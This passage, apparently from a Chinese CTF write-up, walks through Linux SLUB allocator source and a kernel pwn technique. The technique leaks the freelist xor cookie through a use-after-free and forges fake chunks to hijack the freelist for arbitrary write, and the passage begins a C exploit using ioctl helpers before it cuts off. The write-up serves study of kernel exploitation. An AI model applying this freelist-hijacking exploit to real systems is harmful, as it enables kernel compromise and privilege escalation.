<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Find the kmem_cache structure that serves a given size of</span></span><br><span class="line"><span class="comment"> * allocation</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">struct kmem_cache *<span class="title">kmalloc_slab</span><span class="params">(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> index;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(size &gt; KMALLOC_MAX_SIZE)) &#123;</span><br><span class="line">		WARN_ON_ONCE(!(flags &amp; __GFP_NOWARN));</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (size &lt;= <span class="number">192</span>) &#123;                                   <span class="comment">//用size确定index</span></span><br><span class="line">		<span class="keyword">if</span> (!size)</span><br><span class="line">			<span class="keyword">return</span> ZERO_SIZE_PTR;</span><br><span class="line"></span><br><span class="line">		index = size_index[size_index_elem(size)];</span><br><span class="line">	&#125; <span class="keyword">else</span></span><br><span class="line">		index = fls(size - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_ZONE_DMA</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely((flags &amp; GFP_DMA)))</span><br><span class="line">		<span class="keyword">return</span> kmalloc_dma_caches[index];</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">return</span> kmalloc_caches[index];                        <span class="comment">//将对应index的kmem_cache返回给__kmalloc</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>mm/slub.c</code>中查看<code>slab_alloc</code>源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __<span class="function">always_inline <span class="keyword">void</span> *<span class="title">slab_alloc</span><span class="params">(struct kmem_cache *s,</span></span></span><br><span class="line"><span class="function"><span class="params">		<span class="keyword">gfp_t</span> gfpflags, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> slab_alloc_node(s, gfpflags, NUMA_NO_NODE, addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>slab_alloc_node</code>源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">* Inlined fastpath so that allocation functions (kmalloc, kmem_cache_alloc)</span></span><br><span class="line"><span class="comment"> * have the fastpath folded into their functions. So no function call</span></span><br><span class="line"><span class="comment"> * overhead for requests that can be satisfied on the fastpath.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The fastpath works by first checking if the lockless freelist can be used.</span></span><br><span class="line"><span class="comment"> * If not then __slab_alloc is called for slow processing.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Otherwise we can simply pick the next object from the lockless free list.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> __<span class="function">always_inline <span class="keyword">void</span> *<span class="title">slab_alloc_node</span><span class="params">(struct kmem_cache *s,</span></span></span><br><span class="line"><span class="function"><span class="params">		<span class="keyword">gfp_t</span> gfpflags, <span class="keyword">int</span> node, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">void</span> *object;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> *<span class="title">c</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> tid;</span><br><span class="line"></span><br><span class="line">	s = slab_pre_alloc_hook(s, gfpflags);</span><br><span class="line">	<span class="keyword">if</span> (!s)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">redo:</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Must read kmem_cache cpu data via this cpu ptr. Preemption is</span></span><br><span class="line"><span class="comment">	 * enabled. We may switch back and forth between cpus while</span></span><br><span class="line"><span class="comment">	 * reading from one cpu area. That does not matter as long</span></span><br><span class="line"><span class="comment">	 * as we end up on the original cpu again when doing the cmpxchg.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * We should guarantee that tid and kmem_cache are retrieved on</span></span><br><span class="line"><span class="comment">	 * the same cpu. It could be different if CONFIG_PREEMPT so we need</span></span><br><span class="line"><span class="comment">	 * to check if it is matched or not.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		tid = this_cpu_read(s-&gt;cpu_slab-&gt;tid);</span><br><span class="line">		c = raw_cpu_ptr(s-&gt;cpu_slab);                    <span class="comment">//获取kmem_cache_cpu结构体指针</span></span><br><span class="line">	&#125; <span class="keyword">while</span> (IS_ENABLED(CONFIG_PREEMPT) &amp;&amp;</span><br><span class="line">		 unlikely(tid != READ_ONCE(c-&gt;tid)));</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Irqless object alloc/free algorithm used here depends on sequence</span></span><br><span class="line"><span class="comment">	 * of fetching cpu_slab's data. tid should be fetched before anything</span></span><br><span class="line"><span class="comment">	 * on c to guarantee that object and page associated with previous tid</span></span><br><span class="line"><span class="comment">	 * won't be used with current tid. If we fetch tid first, object and</span></span><br><span class="line"><span class="comment">	 * page could be one associated with next tid and our alloc/free</span></span><br><span class="line"><span class="comment">	 * request will be failed. In this case, we will retry. So, no problem.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	barrier();</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * The transaction ids are globally unique per cpu and per operation on</span></span><br><span class="line"><span class="comment">	 * a per cpu queue. Thus they can be guarantee that the cmpxchg_double</span></span><br><span class="line"><span class="comment">	 * occurs on the right processor and that there was no operation on the</span></span><br><span class="line"><span class="comment">	 * linked list in between.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line"></span><br><span class="line">	object = c-&gt;freelist;                                <span class="comment">//获取freelist</span></span><br><span class="line">	page = c-&gt;page;</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!object || !node_match(page, node))) &#123;</span><br><span class="line">		object = __slab_alloc(s, gfpflags, node, addr, c);</span><br><span class="line">		stat(s, ALLOC_SLOWPATH);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">void</span> *next_object = get_freepointer_safe(s, object);<span class="comment">//调用get_freepointer_safe,通过object获取next_object</span></span><br><span class="line"></span><br><span class="line">		 <span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * The cmpxchg will only match if there was no additional</span></span><br><span class="line"><span class="comment">		 * operation and if we are on the right processor.</span></span><br><span class="line"><span class="comment">		 *</span></span><br><span class="line"><span class="comment">		 * The cmpxchg does the following atomically (without lock</span></span><br><span class="line"><span class="comment">		 * semantics!)</span></span><br><span class="line"><span class="comment">		 * 1. Relocate first pointer to the current per cpu area.</span></span><br><span class="line"><span class="comment">		 * 2. Verify that tid and freelist have not been changed</span></span><br><span class="line"><span class="comment">		 * 3. If they were not changed replace tid and freelist</span></span><br><span class="line"><span class="comment">		 *</span></span><br><span class="line"><span class="comment">		 * Since this is without lock semantics the protection is only</span></span><br><span class="line"><span class="comment">		 * against code executing on this cpu *not* from access by</span></span><br><span class="line"><span class="comment">		 * other cpus.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (unlikely(!this_cpu_cmpxchg_double(</span><br><span class="line">				s-&gt;cpu_slab-&gt;freelist, s-&gt;cpu_slab-&gt;tid,</span><br><span class="line">				object, tid,</span><br><span class="line">				next_object, next_tid(tid)))) &#123;</span><br><span class="line"></span><br><span class="line">			note_cmpxchg_failure(<span class="string">"slab_alloc"</span>, s, tid);</span><br><span class="line">			<span class="keyword">goto</span> redo;</span><br><span class="line">		&#125;</span><br><span class="line">		prefetch_freepointer(s, next_object);<span class="comment">//调用prefetch_freepointer,检测next_objext的next_object是否合法</span></span><br><span class="line">		stat(s, ALLOC_FASTPATH);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(gfpflags &amp; __GFP_ZERO) &amp;&amp; object)</span><br><span class="line">		<span class="built_in">memset</span>(object, <span class="number">0</span>, s-&gt;object_size);</span><br><span class="line"></span><br><span class="line">	slab_post_alloc_hook(s, gfpflags, <span class="number">1</span>, &amp;object);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>查看<code>mm/slub.c</code>中<code>get_freepointer_safe</code>源码，发现其中调用了<code>freelist_ptr</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">get_freepointer_safe</span><span class="params">(struct kmem_cache *s, <span class="keyword">void</span> *object)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> freepointer_addr;</span><br><span class="line">	<span class="keyword">void</span> *p;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!debug_pagealloc_enabled())</span><br><span class="line">		<span class="keyword">return</span> get_freepointer(s, object);</span><br><span class="line"></span><br><span class="line">	freepointer_addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)object + s-&gt;offset;</span><br><span class="line">	probe_kernel_read(&amp;p, (<span class="keyword">void</span> **)freepointer_addr, <span class="keyword">sizeof</span>(p));</span><br><span class="line">	<span class="keyword">return</span> freelist_ptr(s, p, freepointer_addr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//-----------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">get_freepointer</span><span class="params">(struct kmem_cache *s, <span class="keyword">void</span> *object)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> freelist_dereference(s, object + s-&gt;offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Returns the freelist pointer recorded at location ptr_addr. */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">freelist_dereference</span><span class="params">(<span class="keyword">const</span> struct kmem_cache *s,</span></span></span><br><span class="line"><span class="function"><span class="params">					 <span class="keyword">void</span> *ptr_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> freelist_ptr(s, (<span class="keyword">void</span> *)*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(ptr_addr),</span><br><span class="line">			    (<span class="keyword">unsigned</span> <span class="keyword">long</span>)ptr_addr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//-----------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">freelist_ptr</span><span class="params">(<span class="keyword">const</span> struct kmem_cache *s, <span class="keyword">void</span> *ptr,</span></span></span><br><span class="line"><span class="function"><span class="params">				 <span class="keyword">unsigned</span> <span class="keyword">long</span> ptr_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">void</span> *)((<span class="keyword">unsigned</span> <span class="keyword">long</span>)ptr ^ s-&gt;random ^ ptr_addr);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">	<span class="keyword">return</span> ptr;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>查看<code>mm/slub.c</code>中<code>prefetch_freepointer</code>，其中调用了<code>freelist_dereference</code>，再调用了<code>freelist_ptr</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">prefetch_freepointer</span><span class="params">(<span class="keyword">const</span> struct kmem_cache *s, <span class="keyword">void</span> *object)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (object)</span><br><span class="line">		prefetch(freelist_dereference(s, object + s-&gt;offset));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Returns the freelist pointer recorded at location ptr_addr. */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">freelist_dereference</span><span class="params">(<span class="keyword">const</span> struct kmem_cache *s,</span></span></span><br><span class="line"><span class="function"><span class="params">					 <span class="keyword">void</span> *ptr_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> freelist_ptr(s, (<span class="keyword">void</span> *)*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(ptr_addr),</span><br><span class="line">			    (<span class="keyword">unsigned</span> <span class="keyword">long</span>)ptr_addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">freelist_ptr</span><span class="params">(<span class="keyword">const</span> struct kmem_cache *s, <span class="keyword">void</span> *ptr,</span></span></span><br><span class="line"><span class="function"><span class="params">				 <span class="keyword">unsigned</span> <span class="keyword">long</span> ptr_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">void</span> *)((<span class="keyword">unsigned</span> <span class="keyword">long</span>)ptr ^ s-&gt;random ^ ptr_addr);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">	<span class="keyword">return</span> ptr;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下载源码放进<code>IDA</code>看了一下，在<code>__kmalloc</code>函数中果然有<code>xor</code>的地方：</p>
<p><img src="https://i.loli.net/2020/03/11/j3HLb862qRaiOSz.png" alt="x2.PNG"></p>
<h2 id="解法一：-5"><a href="#解法一：-5" class="headerlink" title="解法一："></a>解法一：</h2><p>看<code>Kirin</code>师傅的<code>wp</code>学习一波。关于源码的分析都已经写在上面了。</p>
<p><a href="http://nextcloud.chamd5.org/index.php/s/EYTZB4zgtqsfcge#pdfviewer" target="_blank" rel="noopener">http://nextcloud.chamd5.org/index.php/s/EYTZB4zgtqsfcge#pdfviewer</a></p>
<h3 id="思路：-5"><a href="#思路：-5" class="headerlink" title="思路："></a>思路：</h3><p>目的是控制<code>pool</code>，然后任意地址写，实施过程中有两个关键点：</p>
<ol>
<li><code>leak cookie</code></li>
<li>bypass <code>prefetcht0 byte ptr [rbx]</code></li>
</ol>
<p><code>cookie</code>其实有两种办法泄露，一种是直接看源码，另一种是<code>free</code>两个已知地址的堆块，然后利用<code>uaf</code>来读<code>fd</code>位置的值，再经过<code>xor</code>运算得<code>cookie</code>。需要注意的是不同<code>size</code>(指2的次方不同)的chunk的<code>cookie</code>是不同的，但是同一<code>size</code>的<code>cookie</code>是永远不变的。也就是一个<code>kmem_cache</code>一个<code>cookie</code>。至于泄露堆地址，则需要一些几率，<code>exp</code>常常会分配到在<code>offset=0x28</code>的位置存有<code>self_addr+0x28</code>的值的chunk，应该是某一种特殊的chunk留下的脏数据，可利用这一点来泄露堆地址。并为后面伪造<code>fake_chunk</code>做好准备。</p>
<p>比较复杂的是伪造<code>fake_chunk</code>来绕过<code>prefetch0 byte ptr [rbx]</code>的检查。需要精心构造两个<code>fake_chunk</code>及其<code>fd</code>，<code>fake_chunk1</code>的目的一是劫持<code>freelist</code>链到<code>0xffffffffc000461c</code>，二是写入四字节使<code>0xffffffffc000461c</code>的<code>fd</code>解密后能落到<code>fake_chunk2</code>。<code>fake_chunk2</code>的目的是为分配出<code>0xffffffffc000461c</code>这一目的chunk之后使<code>freelist</code>顺利结束(检测到<code>*chunk=chunk^cookie</code>即判断为结束，即<code>next_object=0</code>)。</p>
<p>原本：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">|-----------|      |------------|</span><br><span class="line">|     <span class="number">1</span>     | ---&gt; |     <span class="number">0</span>      |</span><br><span class="line">|-----------|      |------------|</span><br></pre></td></tr></table></figure>
<p>期望：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">|----------|      |-------------|      |--------------------|      |-----------|      |---|</span><br><span class="line">|    <span class="number">1</span>     | ---&gt; | fake_chunk1 | ---&gt; | <span class="number">0xffffffffc000461c</span> | ---&gt; |fake_chunk2| ---&gt; | <span class="number">0</span> |</span><br><span class="line">|----------|      |-------------|      |--------------------|      |-----------|      |---|</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/03/12/d7R1LSgPntaTkzr.png" alt="x3.PNG"></p>
<h3 id="exp：-23"><a href="#exp：-23" class="headerlink" title="exp："></a>exp：</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pty.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> index;</span><br><span class="line">    <span class="keyword">char</span>* buf;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>* <span class="title">user_chunk</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">uread</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">int</span> index,<span class="keyword">char</span>* buf,<span class="keyword">long</span> <span class="keyword">long</span> size)</span></span>&#123;</span><br><span class="line">    user_chunk-&gt;index = (<span class="keyword">size_t</span>)index;</span><br><span class="line">    user_chunk-&gt;buf = buf;</span><br><span class="line">    user_chunk-&gt;size = size;</span><br><span class="line">    ioctl(fd,<span class="number">0x30003</span>,user_chunk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">uwrite</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">int</span> index,<span class="keyword">char</span>* buf,<span class="keyword">long</span> <span class="keyword">long</span> size)</span></span>&#123;</span><br><span class="line">    user_chunk-&gt;index = (<span class="keyword">size_t</span>)index;</span><br><span class="line">    user_chunk-&gt;buf = buf;</span><br><span class="line">    user_chunk-&gt;size = size;</span><br><span class="line">    ioctl(fd,<span class="number">0x30002</span>,user_chunk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">new</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">int</span> index,<span class="keyword">char</span>* buf,<span class="keyword">long</span> <span class="keyword">long</span> size)</span></span>&#123;</span><br><span class="line">    user_chunk-&gt;index = (<span class="keyword">size_t</span>)index;</span><br><span class="line">    